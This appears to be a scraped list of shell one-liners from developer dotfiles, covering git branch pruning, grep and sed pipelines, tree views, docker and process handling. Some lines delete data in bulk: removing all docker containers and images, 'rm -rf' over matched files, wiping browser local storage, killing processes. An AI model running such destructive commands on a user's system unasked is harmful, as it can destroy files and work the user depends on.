grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)'
grep -E 'doc$|odp$|pdf$|txt$|log$|htm$|html$|djvu$|epub$'
grep -E '\<\<(([0-9]|[1-9][0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-4]))\>\.){3}(\<[0-9]|[1-9][0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-4])\>)\>'
git status -s | grep '\.php\|\.phtml\|\.inc\|\.module' | sed 's/ ?[M|\?\?]+ //' -r | sed 's/ T[^\n]*//' | xargs -I {} phpcs {}
git remote -v | grep github.com | head -n1 | awk '{print $2}' | cut -d@ -f2 | sed 's/:/\//' | sed 's/.git//g' | sed 's/^\(.*\)/https\:\/\/\1/g' | xargs -n1 open
git ls-tree --name-only -z -r HEAD | xargs -0 -n1 git blame --line-porcelain | grep '^author ' | sed -e 's/^author //;' | sed 's/notbryant/Jon Petraglia/g;' | sed 's/MrQweex/Jon Petraglia/g;' | sort | uniq -c | sort -nr
git checkout \$(git reflog | rg 'checkout: moving from' | gsed 's/.*moving from \([^ ]\+\).*/\1/' | gcat -n | gsort -uk2 | gsort -nk1 | cut -f2- | ghead | sk)
git branch -a | grep -v HEAD | perl -ne 'chomp($_); s|^\*?\s*||; if (m|(.+)/(.+)| && not $d{$2}) {print qq(git branch --track $2 $1/$2\n)} else {$d{$_}=1}' | csh -xfs
gem uninstall -axI `gem list --no-versions |grep -v test-unit |grep -v psych |grep -v rdoc | grep -v minitest |grep -v io-console | grep -v json |grep -v rake |grep -v bigdecimal`
g4 diff -c default | grep '====' -A1 | sed 's/--//g' | sed 's/#[0-9]\+ - .*$//g' | sed '/====/ { N; s/\n[^=]/ ! /g; P; D } ' | sed '/!/ D' | grep 'depot' | sed 's/==== \/\/depot\/[^\/]\+\///g' | xargs -n 1 g4 revert
for f in \$(git clean -dxn | sed 's|Würde ||g' | sed 's| löschen||g'); do mkdir -p $(dirname ../bakbak/\$f); mv \$f ../bakbak/\$f; done
find ./src | grep \\.git/ | grep -v -e /goreturns/ | grep -v -e /delve/ | grep -v -e /gomodifytags/ | grep -v -e /gometalinter/ | grep -v -e /godef/ | grep -v -e /gogetdoc/ | grep -v -e /gocode/
find . -regex '.*\.\(java\|c\|cpp\|h\|hpp\|asm\|s\|xml\)$' -a ! -name '*.git' | xargs grep
find . -regex '.*\.\(java\|c\|cpp\|h\|hpp\|asm\|s\|xml\)$' -a ! -name '*.git' | ctags -L - --extra=+q --sort=yes --tag-relative=yes
env PATH=$(echo $PATH | sed -E 's|'$(pyenv root)'/shims:||g' | sed -E 's|/Users/lxuser/Library/Python/3.6/bin:||g') brew
echo DATABASES:; ps -ef | grep [p]mon_ | sort -k8; echo; echo LISTENERS:;ps -ef | grep [t]nslsnr | sort -k8; echo; echo AGENTS:; ps -ef | grep -i [d]bsnmp; ps -ef | grep -i [e]magent | grep -v java; echo; echo DATA GATHERERS:; ps -ef | grep -i [v]pp; echo
docker stop $(docker ps -a -q) || true && docker rm $(docker ps -a -q) || true && docker rmi $(docker images -q -f dangling=true) || true && docker rmi $(docker images -q) || true
cd ~/Library/Application\ Support/Google/Chrome/Default/Local\ Storage/; ls -1 | grep -E -v '(neogaf|steam|google|netflix|github|reddit|slack)' | xargs rm -f
[[ -f typescript ]] && egrep -v '%|--:--|<=>' typescript | less || egrep -v '%|--:--|<=>' ~/typescript | less
"yarn serve | h -i ""abc"" ""initialized"" ""build/"" ""FIREBASE|/axel|/functions|/node_modules"" ""TypeError: Cannot read property|errorInfo:|error:|undefined"" ""defghi"" "" at |--WARNING-- @axel-debugger catched this "" \"
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep ""energy:\|energy-full\|energy-full-design\|energy-rate\|voltage\|time to empty\|percentage\|capacity"""
"tree -afC -I ""\.git|.idea|venv|vendor|pkg|target|targets|node_modules"" | less -SRI"
"tree -a -I "".bzr|CVS|.git|.hg|.svn|node_modules|misc|coverage|.next"""
"tree -I ""*.dyn_hi|*.dyn_o|*.o|*.jsexe*|*.hi|*.js_o|*.js_hi|dist|bin"""
"tree -F --dirsfirst -a -I "".git|.hg|.svn|__pycache__|.mypy_cache|.pytest_cache|*.egg-info|.sass-cache|.DS_Store"" --ignore-case"
"tmux list-clients | sed ""s|^\(/dev/ttys[0-9]\+\).*\[\([0-9]\+x[0-9]\+\).*$|\2 \1|"" | sort -r -n | tail -n +2 | cut -d "" "" -f 2 | xargs -n 1 tmux detach-client -t"
"svn st | grep ^\? | grep -v "".idea"" | grep -v "".iml"" | grep -v "".java"" | grep -v "".patch"" | grep -v "".xml"" | cut -c7-500 | xargs rm -rvf"
"ssh-keygen -R $(echo `fc -ln -1` | sed ""s|.* ||"" | sed ""s|.*@||"")"
"show.ip_local | sed ""s|:\(.*\)$|: $( color yellow )\1$( color none )|g"" ; show.ip_remote | sed ""s|:\(.*\)$|: $( color green )\1$( color none )|g"""
"service --status-all|egrep ""cloud|virt|dnsm|mysq|ntp|nfs|bind|tomc"""
"sed ""s|sudo ||g"" ~/.bash_history|cut -d "" "" -f 1|sort|uniq -c|sort -rn|head -20"
"repquota -a 2>/dev/null|awk '{print \$6,\$1}'|egrep -v '#|Block|\*|User|used|\-'|sort -n"
"repos=`svn info|grep ""URL: .*trunk""|sed ""s/URL: \(.*\)trunk/\1/""`;list=`svn ls ${repos}tags`;echo -ne $list|grep ""^release_""|sed ""s/release_\(.*\)\//\1/""|sort -t . -k 1,1 -k 2,2n -k 3,3n|sed ""s/\(.*\)/release_\1/"";echo -ne $list|grep -v ""^release_""|sort"
"printenv | grep ""VSPHERE\|DOCKER\|DNS"" |grep -v ""VERSION\|SHA256\|BUCKET\|URL"" | sort"
"pbpaste | egrep '^ (test.*\(|/.*\.txt)' | cut -d\( -f1 | sed 's,.*/,,' | xargs | tr ' ' '\|' | xargs -J% bin/alltests -v -v -v -t '%'"
"netstat -an | egrep ':80|:443' | grep ESTABLISHED | awk '{print $5}' | grep -o -E '([0-9]{1,3}[\.]){3}[0-9]{1,3}' | sort -n | uniq -c | sort -nr"
"nameservers=$(scutil --dns | grep nameserver | grep -v ""127.0.0.1"" | sort -u | cut -d"":"" -f2 | sed ""s/ //g"" | sort -u | tr ""\n"" "","" | awk -F, ""{ printf $1; for (i=2; i < NF; i++) printf \"",\""$i }""); sudo networksetup -setdnsservers Wi-Fi 127.0.0.1 && sudo networksetup -setdnsservers ""Thunderbolt Ethernet"" 127.0.0.1 && sudo ~/bin/dnschef.py --fakeipv6 ::1 --fakeip 10.25.1.10 --fakedomains *.local.*,*.local.*.*,*.local.*.*.*,*.local.*.*.*.*,*.*.local.*,*.*.local.*.*,*.*.local.*.*.*,*.*.local.*.*.*.* --nameserver $nameservers"
"mount |grep -E ""ext[2-4]|reiserfs|vfat|ntfs|xfs|jfs|zfs"" |column -t"
"mkr hosts | ruby -e ""require \""json\"";JSON.parse(STDIN.read).each{ |n| puts n[\""roleFullnames\""][0].ljust(40) + n[\""name\""] }"" | percol | ruby -e ""STDIN.readlines.each { |n| print n.split(/ /)[-1] }"" | pbcopy && echo `pbpaste` && ssh planbcd@`pbpaste`"
"mkdir converted; for f in *.psd; do convert ""$(echo $f)[0]"" ""converted/$(echo $f | sed -e `s|\.psd|\.png|g`)"" && echo ""Converted `$f` to $(echo $f | sed -e `s|\.psd|\.png|g`) ...""; done"
"ls -umpR */*.c | cat | tr ""\n"" ""@"" | rev | cut -c2- | rev | sed ""s/@/ \\\@/g"" | tr ""@"" ""\n"" | tr -d "","""
"ls -ump *.c | cat | tr ""\n"" ""@"" | rev | cut -c2- | rev | sed ""s/@/ \\\@/g"" | tr ""@"" ""\n"" | tr -d "","""
"kubectl get pod | sort -nk 4 | grep -v ""Running 0\|NAME"" | cut -d"" "" -f1 | xargs -i kubectl describe pod {} | grep ""Reason\|^Name:\|Finished"""
"grep -E -o ""(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)"""
"git status -s | grep -e ""^\(DD\|AU\|UD\|UA\|DU\|AA\|UU\)"" | cut -d "" "" -f2"
"git reflog show | grep '}: commit' | nl | sort -nr | nl | sort -nr | cut --fields=1,3 | sed s/commit://g | sed -e 's/HEAD*@{[0-9]*}://g'"
"git ls-tree -r HEAD|sed -re ""s/^.{53}//""|while read filename; do file ""$filename""; done|grep -E "": .*text""|sed -r -e ""s/: .*//""|while read filename; do git blame -w ""$filename""; done|sed -r -e ""s/.*\((.*)[0-9]{4}-[0-9]{2}-[0-9]{2} .*/\1/"" -e ""s/ +$//""|sort|uniq -c"
"git branch | grep -v ""rico\|develop\|beta_local\|staging\|staging_hotfix\|staging_server_hotfix\|production"" | xargs git branch -D"
"git branch -a --merged remotes/origin/master | grep -v master | grep ""remotes/origin/"" | cut -d ""/"" -f 2- | xargs -n 1 git branch -Dr && git branch --merged | grep -v ""\*"" | grep -v master | grep -v dev | xargs -n 1 git branch -D"
"git branch --merged | grep -vE ""^\*|master$|release$|develop|production|staging|integration$"" | xargs -I % git branch -d %"
"git branch --merged | grep -v develop | grep -v master | grep -v ""$(git branch | grep \* | cut -d "" "" -f2)"" | grep -v "">"" | xargs -L1 | xargs -n1 git branch -d"
"git branch --merged | grep -Ev ""(\*|master|prod|dev|develop|staging|beta)"" | xargs -n 1 git branch -d"
"git branch --merged | grep -Ev ""(\*|master|develop|qa|staging|next|feature/next)"" | xargs -n 1 git branch -d"
"git branch --merged master | grep -v ""develop\|master\|qa\|release\|staging\|test\|^\*"" | xargs -n 1 git branch -d"
"find_callback(){ str=""[>\.]+\s*""$@""\s*\(""; find . -type f -print0 | grep --color=no -zaiE "".*\.(cpp|hpp|c|h|hh|cxx|cc)$""|xargs -0 grep -aHnP --color=$COLOR_FLAG $str; }; find_callback"
"find_call(){ str=""[^a-zA-Z_]+""$@""\s*\(""; find . -type f -print0 | grep --color=no -zaE "".*\.(cpp|hpp|c|h|hh|cxx|cc)$""|xargs -0 grep -aHnp --color=$COLOR_FLAG $str; }; find_call"
"find . | grep -E ""(__pycache__|\.pyc$|.mypy_cache|.eggs|\.tox|htmlflake8|htmlcov)"" | xargs rm -rf"
"find . -type f -print0 | grep --color=no -zaiE "".*\.(cpp|hpp|c|h|hh|cxx|cc)$""|xargs -0 grep -aHn --color=$COLOR_FLAG"
"find . -type f -name ""*.yml*"" | sed ""s|\./||g"" | egrep -v ""(\.kitchen/|\[warning\]|\.molecule/)"" | xargs yamllint -f parsable"
"find . -name ""*[.h|.c|.hpp|.cpp|.go|.rs|.py]"" -type f | xargs cat | wc -l"
"egrep ""^ACCOUNT_CODE=|^PROJECT_ID=|^SERVER_TYPE=|^DB_TYPE=|^APP_TYPE=|^SHC_TYPE=|^EMAIL_DBA=|^EMAIL_VERIFIER=|^EMAIL_HCTEAM="" ~/Security/db2shc.cfg "
"egrep ""^ACCOUNT_CODE=|^PROJECT_ID=|^SERVER_TYPE=|^DB_TYPE=|^APP_TYPE=|^SHC_TYPE=|^EMAIL_DBA=|^EMAIL_VERIFIER=|^EMAIL_HCTEAM="" "
"echo -e ""\n\n"" && ps aux | grep ""httpd|apache"" | h ""/usr/sbin/"" ""FOREGROUND"" ""axel"" ""root"" ""_www"" "" --database="" "" --annotation="" "" --url="" ""/Applications/Atom.app"" ""/Applications/Google"" ""/bin|/data|/usr/local|/lib/plugin|.local.err|.local.pid"" ""/usr/local/mysql/bin/mysqld"" && echo -e ""\n\n"" "
"echo -e ""\n\e[1;93mVERSION\e[0m"" && cat /etc/issue|head -1|cut -d"" "" -f1-3 && echo -e ""\n\e[1;93mKERNEL\e[0m"" && uname -r && echo -e ""\n\e[1;93mPROCESSOR\e[0m"" && cat /proc/cpuinfo | grep processor| wc -l | xargs echo -n && echo -e "" processors"" && cat /proc/cpuinfo |grep MHz| uniq && echo -e ""\n\e[1;93mNETWORK\e[0m"" && ifconfig|grep -A1 ""eth""&& echo -e ""\n\e[1;93mLOADAVG\e[0m"" && cat /proc/loadavg && echo -e ""\n\e[1;93mMEMORY\e[0m"" && free -m && echo -e ""\n\e[1;93mDISK SPACE\e[0m"" && df -h && echo -e ""\n"""
"du -x . | sort -n |cut -d\/ -f1-2|sort -k2 -k1,1nr|uniq -f1|sort -n|tail -20|cut -f2|xargs du -sxh"
"docker images | cut -d "" "" -f1 | tail -n +2 | sort | uniq | egrep -v ""^<none>$"" | xargs -L1 docker pull && docker images | awk ""/<none/{print $3}"" | xargs docker rmi"
"curl -s http://whatismycountry.com/ | sed -n 's|.*> *\(.*\)</h3>|\1|p' | sed 's|,|, |'"
"cmsRun ${VALTOOLS}/MergeFilesAndCalculateEfficiencies_cfg.py `ls BatchJobs/*_0.root | sed ""s|_0.root|.root|"" | sed ""s|BatchJobs/||""` BatchJobs/*root"
"cd `git rev-parse --show-toplevel` ; git status --untracked --porcelain | grep ""^\\?\\?"" | awk -e ""{ print \$2; }"" | grep ""\\(\\.orig$\\)\\|\\.\\(BACKUP\\|BASE\\|LOCAL\\|REMOTE\\)\\."" | xargs rm"
"cat ~/.bash_history | sed ""s|sudo ||g"" | cut -d "" "" -f 1 | sort | uniq -c | sort -n"
"ap=`iwconfig wlp1s0 | grep Access | tr "" "" ""\n"" | grep -1 Point | tail -n1 | tr A-Z a-z` && cat ~/Dropbox/Uploads/WifiAnalyzer_Alias.txt | grep ""$ap"" || echo $ap"
"adb logcat -c & adb logcat | grep ""Exception$\|Error$\|Exception: \|Error: \|: at \|: Caused by: \|: \.\.\.\|\*\*\*\*\*"""
"LANG=C xrandr -q | grep -o ""current [0-9]\{3,4\} x [0-9]\{3,4\}"" | sed -e ""s|current ||g"" -e ""s|\ ||g"""
"(echo;find . -mindepth 1 -maxdepth 1 -type d | while read dir; do echo -e ""$(find ""$dir"" | wc -l)\t$dir""|sed ""s|./| |g"";done|sort -nr|head -n 10;echo) 2>/dev/null"
"(cd /var/cache/pacman/pkg && ls -1 . | sed ""s/lib32-/lib32_/"" | cut -d""-"" -f1 | sed ""s/lib32_/lib32-/"" | sort -u | while read f; do du -cah $f-* | tail -n1 | sed ""s/total/$f/"" ; done | sort -h)"
tree -aC -I 'vendor|node_modules|nbproject|coverage|.git|storage|.idea|.DS_Store'
tree -a --noreport -C --dirsfirst -I 'vendor|test|.tmp|tmp|components|node_modules|bower_components|\.git'
test -e .svn && (svn st | grep ? | cut -d' ' -f7 | xargs svn add) || (test -d .git && git add -A . || (currentdir=$PWD && cd .. && git add -A . && cd $currentdir))
tac ./storage/logs/whoops52.log | sed -r '/\[.{19}\]\slocal\.(ERROR|INFO)/q' | tac | sed 's/\/app\//\/App\//' | sed -r 's/(\/[^A-Z]*)*\///' | sed -r 's/^#[0-9]*\s//' | head
tac ./storage/logs/laravel.log | sed -r '/\[.{19}\]\slocal\.(ERROR|INFO)/q' | tac | sed 's/\/app\//\/App\//' | sed -r 's/(\/[^A-Z]*)*\///' | sed -r 's/^#[0-9]*\s//' | head
svn status -u | grep -v linux26-i686 | grep -v linux26-x86_64 | grep -v \\.swp | grep -v \\.d | grep -v \\.gch | grep -v tags | grep -v cases
sudo netstat -anp | grep 'tcp\|upd' | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n
sudo docker images | cut -d ' ' -f1 | tail -n +2 | sort | uniq | egrep -v '^(<none>|ubuntu)$' | xargs -P0 -L1 sudo docker pull
sed -e 's|\s\+| |g' -e 's|^\s\+||g' | cut -d ' ' -f
sed ':a;N;$bash;s/\n/ /g' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' | sed -e 's/[^a-zA-Z0-9]/_/g' | sed ':a;N;$bash;s/\n/ /g' | sed s/\ /_/ | sed -e 's/^/git checkout -b feature\/alvi_/' | sed s/NTP_/NTP-/ | sed s/__/_/g
ps aux | pgrep -lf 'spring|rails|ruby|puma|sneakers' | awk '{print $1}' | xargs kill -9
ps aux | grep node | grep -v grep | grep -vi slack | grep -vi skype | grep -vi postman | grep -vi webstorm | grep -vi microsoft
ps aux | grep '\(gulp\|node\|npm\)' | grep -v 'atom' | awk '{print $2}' | cut -d' ' -f2 | sudo xargs kill -9
ps aux | egrep -w 'redis|solr|rails|sidekiq|puma|rails|mailcatcher'
ps -ef | tr -s ' ' | cut -d ' ' -f8 | grep -v '^\[' | grep -v CMD | sort | uniq -c | sort -nr
paste <(pacman -Q | awk '{ print \$1; }' | xargs pacman -Qi | grep 'Size' | awk '{ print \$4\$5; }') <(pacman -Q | awk '{print \$1; }') | sort -n | column -t
paste <(pacman -Q | awk '{ print \$1; }' | xargs pacman -Qi | grep 'Size' | awk '{ print \$4\$5; }') <(pacman -Q | awk '{print \$1; }') | sort -h | column -t
pacman -Qi | egrep '^(Name|Installed)' | cut -f2 -d':' | paste - - | column -t | sort -nk 2 | grep MiB
make integration-coverage 2>&1 | egrep \`git diff master --name-only | sed 's/\//\./g' | sed 's/\.py$//g' | xargs | sed 's/ /|/g'\` | grep -v '100%'
make coverage 2>&1 | egrep \`git diff master --name-only | sed 's/\//\./g' | sed 's/\.py$//g' | xargs | sed 's/ /|/g'\` | grep -v '100%'
ls $HOME/indigo | xargs -I % -n 5 sh -c 'cd % && pwd && git stash || true && git checkout develop || true && git pull || true'
kubectl get pods --all-namespaces -owide | grep Running | egrep -v 'monitoring|kubeflow|kube-system|tensorboard|default|kube-master'
inout | grep 'arvaniti\|hargus\|greisman\|klepeis\|donchev\|mcgibbon\|yuku'
ifconfig | tr '\t' ' ' | tr -s [:space:] | sed -e '/^ [^s]/d' | grep --color=never -B1 'status: active' | sed -e '/^ /d' -e 's/\(.*\):.*$/\1/' | tr '\n' ' ' | cut -d ' ' -f1
ifconfig | grep 192.168 || ifconfig | grep 10.32 || ifconfig | grep 10.213
if [[ $(ps aux | grep 'ssh-agent' | grep -v 'grep' | wc -l) -gt 1 ]]; then ps aux | grep 'ssh-agent' | grep -v 'grep' | awk '{print \$2}' | xargs kill; fi; if [[ -n \
if [[ $(ps aux | grep '/ssh-agent' | grep -v 'grep' | wc -l) -gt 1 ]]; then ps aux | grep '/ssh-agent' | grep -v 'grep' | awk '{print \$1}' | xargs kill; fi; if [[ -n \
history | tr -s ' ' | cut -d ' ' -f 3 | sort -n | uniq -c | sort -n | tail -n 10 | sort -r
history | tr '\011' ' ' | tr -s ' ' | cut -d ' ' -f 3 | sort | uniq -c | sort -nbr | head -n 10
hg log . --template '{node|short} | {date|isodatesec} | {desc|strip|firstline} <{author|user}>\n'
hg log --template '{node|short} | {date|isodatesec} | {author|user}: {desc|strip|firstline}\n'
grep -v JPEG|grep -v ASCII | grep -v HTML|grep -v gzip|grep -v PNG|grep -v data | grep -v text|\
grep --color=always -i 'fail\|error\|failed\|exception\|undefined\|missing\|raise\|$'
grep '\.java:\|\.h:\|\.hpp:\|\.cpp:\|\.c:\|\.cc:\|\.[sS]:\|\.asm'
grep 'TODO\:\|REVIEW\:\|BUG\:\|NOTE\:\|FIXME\:\|XXX\:\|HACK\:\|UX\:' err.txt generated.file succ.txt -nri
git reflog | grep checkout | grep -o -E 'to (.*)' | sed -e 's/to/ /' | sed -e '1s/ / ∗ /' | sed -e '1s/^/git branch history:\'$'\n/' | sed -e '1s/$/\'$'\n/' | head -n 8
git log | grep Author | cut -d':' -f2 | cut -d'<' -f1 | sort | uniq -c | sort -rn | head -n1
git for-each-ref --color=always --sort=-committerdate refs/heads --format='%(HEAD)%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)' | column -ts'|' | grep Nick | less -S
git fetch origin && git remote prune origin && git checkout master && git branch -r --merged | grep -v master | grep -v staging | sed -e 's/origin\//:/' | xargs git push origin && git reset --hard origin/master && git branch --merged | grep -v master | grep -v staging | xargs git branch -d
git diff | egrep -i '(puts)|(abort)|(debug)|(byebug)|(alert)|(console.log)|(TODO)'
git branch -r --list --no-merged | grep -v '*' | xargs -Ibranch git log -1 --pretty=format:'|branch|%an|%ad|%s|' --date=short branch
git branch --merged | rg -v '\*' | sed -e 's/[*| ] //' | rg -v '^(master|release|develop)$' | xargs -I % git branch -d %
git branch --merged | egrep -v '^\\*|master|dev|development|developer|staging' | xargs -n 1 git branch -d && echo '...branches synced'
find . | awk '!/CVS|\.git|\.svn|_Stub|\.#/ {print \$0;}' | sed 's/\ /\\\ /g' | xargs grep --color=always -in
find . -type f | awk -F. '{ print \$3}' | sed '/^$/d' | sed '/^[A-Z]/d' | sed '/[a-z]/!d' | sed '/[a-z]$/!d' | awk 'length(\$0)<5' | awk 'length(\$0)>1'
feh --title '%f | %wx%h | %S | %t | %m | %n | %p | %u/%l'
exa --all --long --sort=type --git --git-ignore --ignore-glob='*~|.git|node_modules|coverage|pyvenv|__pycache__|.pytest_cache|htmlcov'
echo ' remote'; rbenv install -l | grep '^ 2\|^ 1.9' | grep -v '\-dev\|\-preview\|\-rc\|1.9.1\|1.9.2'
echo $(($(git log --grep snemeth --grep Szilard --grep 'Szilard Nemeth' --oneline | grep YARN | wc -l | tr -s ' ' | cut -d ' ' -f2) + $(git log --author=snemeth --oneline | wc -l | tr -s ' ' | cut -d ' ' -f2)))
dpkg --list | grep -E 'linux-(image|headers)-[[:digit:]]' | awk '{ print $2 }' | sort | grep -v $(uname -r | perl -pe 's/(\d.+\d).+/\1/') | xargs sudo apt-get purge -y
docker ps -a | grep Exited | sed 's: .*::g' | xargs docker rm; docker images | grep '<none>' | sed 's: *:@:g' | cut -d @ -f 3 | xargs docker rmi
df |\grep -i '^Filesystem\|^Sist\|geof\|scratch2\|'$USER'\|/programas\|/Sismica_desenv'
df -h |\grep -i '^Filesystem\|^Sist\|geof\|scratch2\|'$USER'\|/programas\|/Sismica_desenv'
dd if=/dev/random bs=2048 count=1 2>/dev/null | md5sum | sed 's| .*||' | tr -d '\n' | pbcopy
curl -s -m 8 eth0.me || curl -s -m 5 ifconfig.me || curl -s -m 5 icanhazip.com || $WWWDUMP http://www.getip.com | sed -n 's/^Current IP: //p'
comm -23 <(find ~/.ssh -type f -name '*.pub' | perl -pe 's/\.pub\$//' | sort -u) <(ssh-add -l | awk '{ print \$3 }' | sort -u) | perl -pe 's!^.*/!!' | fzf | xargs -I{} ssh-add -K ~/.ssh/{}
code --list-extensions | grep -Ev '(nativescript|intelephense|php|react|rust|twig)' | sort -f > ~/dotfiles/vscode/extensions.txt
clear;find . $@ | grep -v '.git' | grep -v '.pyc$' | grep -v '__pycache__' | grep -v '~$' | grep -v '/#' | grep -v '/.#' | less
alias | grep -v -e 'aliasx=' | sort | sed -E -e 's|^([^=]*)=(.*)|${fg_bold[blue]}\\\1###${fg[white]}\\\2${reset_color}|' | column -s '###' -t
ag bitbucket | grep indev | sed 's|.*\(indev/[^/.]*\).*|-   \1|' | sort | uniq
(env | egrep -v '^(PS4|PS3|HISTTIMEFORMAT|LS_COLORS|_)=' ; set ) | grep --color=always '^[^[:space:]]*=' | sort -u
(echo 'Xiuyu Li <nickleefly@gmail.com>'; git authors | grep -v 'nickleefly' | perl -pi -e 's|\([^\)]*\)||g' 2>/dev/null | sort | uniq)
(echo 'Isaac Z. Schlueter <i@izs.me>'; git authors | grep -v 'isaacs' | perl -pi -e 's|\([^\)]*\)||g' 2>/dev/null | sort | uniq)
"| awk '/System-Provided/,/VCAP_APPLICATION/' | tail -n +2 | tail -r | tail -n +3 | tail -r | jq '.VCAP_SERVICES' | jq"
"vlc ""$(find . -type f -regextype posix-awk -iregex "".*\.(avi|mpg|mpeg|mkv|wmv|dat)$"" | sort --random-sort | head -n 1)"""
"upower -d | grep -e state -e percentage -e time | sort -u | tr ""\n"" "" "" | sed ""s|^[^0-9]*\([0-9]*%\)[^:]*:\ *\([^\ ]*\)[^0-9\.]*\([0-9\.]*\)[^0-9]*$|(\1, \2, \3h)|g""; echo"
"upower -d | grep -E ""battery|mouse|keyboard|percentage|time to full|time to empty|state"""
"tree -afC -I ""\.git|.idea|venv|vendor|pkg|target|targets|node_modules"""
"tree -afC -I ""\.git|.idea|venv|vendor|pkg|target|targets|node_modules"" ""src"""
"tree -a -I ""__pycache__|.hg|.git|.DS_Store|htmlcov|.hgcheck|src|.idea"" --dirsfirst"
"tree -C --dirsfirst -I ""coverage|build|dist|*srv|elm-stuff|_build|*.byte|*.native"" "
"tree --du --si --filelimit 512 -I ""node_modules|bower_components|vendor|bundle|target|build|public|.git"" -L 5"
"time echo \""""$@""\"" | ( Equalizer || espeak || say -v Fred || cat)"
"tail -10000 /var/log/nginx/access.log | cut -d "" "" -f1 | sort | uniq -c | sort -n | tail -n 30 | sort -nrk 1 | awk "
"sudo cat /var/log/apache2/error.log | grep -- ""->"" | grep -o ""from [^ ]*"" | cut -d"" "" -f2 | sort | uniq -c | sort -nr | less"
"sudo apt update | colout ""Get"" 118 | colout ""Ign"" 124 | colout ""Hit"" 226 | colout ""^.*see.*$"" 51 | colout ""\d* .B | \d*.\d* .B"" 3 | colout ""http.+ "" 6"
"ssh $(cat ~/.ssh/config | grep Host | grep -v HostName | grep -v Hostname | grep -v Hosts | grep -v StrictHost | awk ""{print \$2}"" | peco)"
"route -n | grep ""^0.0.0.0"" | head -1 | tr -s "" "" | grep -o ""[^ ]*$"" | xargs -I{} ip -4 -o addr show dev {} | tr -s "" "" | awk -F"" "" ""{print \$4}"""
"rm -f TAGS; find . -regex "".*\.\(c\|h\|el\|rb\|py\|sh\|php\)"" -print | xargs etags -a"
"rm -f TAGS; find . -regex "".*\.\(c\|cpp\|go\|h\|rb\|py\|php\)"" -print | xargs etags -a"
"pss | grep -v grep | egrep --color=always ""(ssh|COMMAND|ss-local|httpd|watch_socks|watch_sso)"""
"psql -Xc ""\\du"" postgres | tail -n +4 | head -n -1 | cut -d\| -f1 | tr -d "" "" | awk ""NF"" | sort"
"psg ""parse\|flow\|train\|maxminer\|_rtbminer\|_tnative\|ipython-notebook\|submit"""
"ps aux | grep pts | grep -v ""\-bash"" | grep ""\+"" | grep -v tmux | grep -v grep | grep -v ""ps aux"" | grep -v ""pts/0"""
"ps -eo user:25,cmd --sort=user | grep Xvnc | grep -v grep | grep -v thinlinc | awk '{print \$1}' | uniq -c | grep -v ' 1 ' | sort -r"
"ps -ef | grep qemu | awk '{print \$10,\$12,\$13,\$14,\$15,\$17,\$18,\$19}' | egrep 'slave|master|tomcat|jboss|mysql'"
"ps -ef | grep -v grep | grep -P ""ssh|vim|tmux|screen"" || echo ""clean"""
"pbpaste | egrep '^ +(test.*\(|/.*\.txt)' | cut -d\( -f1 | sed 's,.*/,,' | xargs | tr ' ' '\|'"
"paste <(pacman -Q | awk ""{ print $1; }"" | xargs pacman -Qi | grep ""Size"" | awk ""{ print $4$5; }"") <(pacman -Q | awk ""{print $1; }"") | sort -n | column -t"
"pacman -Qmq | grep -Ee ""-(cvs|svn|git|hg|bzr|darcs)$"" | yay -S --answeredit n --answerclean n --answerdiff n --noremovemake --sudoloop --needed -"
"pacman -Qi | egrep ""^(Name|Installed)"" | cut -f2 -d"":"" | paste - - | column -t | sort -nr -k 2 | grep MiB"
"open ""$(ls | ag .xcworkspace$ || ls | ag .xcodeproj$ || ls | ag .playground$)"""
"notify-send -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$([ $? = 0 ] && echo Completed || echo Error)"" ""$(history|tail -n1|sed -r ""s/^\s*[0-9]+\s*//; s/\s*[;&|]\s*alert.*$//"")"""
"norhosts=$(scp broker.prod.ltp.ec2.external:/etc/hosts /dev/stdout | cat); ec2hosts=$(scp broker.prod.nor.external:/etc/hosts /dev/stdout); allhosts=$(echo ""$norhosts""; echo ""$ec2hosts""); echo ""$allhosts"" | sort -n | uniq | grep --invert ""^::1\|127\.0\.0\.1"" | cut -d "" "" -f 2 | sort"
"ngtree -I ""spec|features|doc|tmp|vendor|test|log|.*"""
"mvn clean install -U -Dgpg.skip=true -P Atnv2-TU,gwt-dev,resources-dev 2>&1 | grep -v ""DATABASECHANGELOG|executed|changeset|expected\ postgresql,\ got\ h2|Successfully\ released\ change\ log\ lock|Successfully\ acquired\ change\ log\ lock"" | h -i error info warn debug"
"mvn clean install -U -Dgpg.skip=true -P Atnv2-TU,gwt-dev,resources-dev 2>&1 | grep -v ""DATABASECHANGELOG|executed|changeset|expected\ postgresql,\ got\ h2|Successfully\ released\ change\ log\ lock|Successfully\ acquired\ change\ log\ lock"" | h -i $MVN_ALL"
"ls| egrep --color=never ""(mp4|webm|flv|m4v|3gp|mkv|avi)$"""
"ls -ahl | more; echo ""\e[1;32m --[\e[1;34m Dirs:\e[1;36m `ls -al | egrep \""^drw\"" | wc -l` \e[1;32m|\e[1;35m Files: \e[1;31m`ls -al | egrep -v \""^drw\"" | grep -v total | wc -l` \e[1;32m]--"""
"ls -ahl -G --color | more; echo ""\e[1;32m --[\e[1;34m Dirs:\e[1;36m `ls -al | egrep \""^drw\"" | wc -l` \e[1;32m|\e[1;35m Files: \e[1;31m`ls -al | egrep -v \""^drw\"" | grep -v total | wc -l` \e[1;32m]--"""
"ls -ahl --color | more; echo ""\e[1;32m --[\e[1;34m Dirs:\e[1;36m `ls -al | egrep \""^drw\"" | wc -l` \e[1;32m|\e[1;35m Files: \e[1;31m`ls -al | egrep -v \""^drw\"" | grep -v total | wc -l` \e[1;32m]--"""
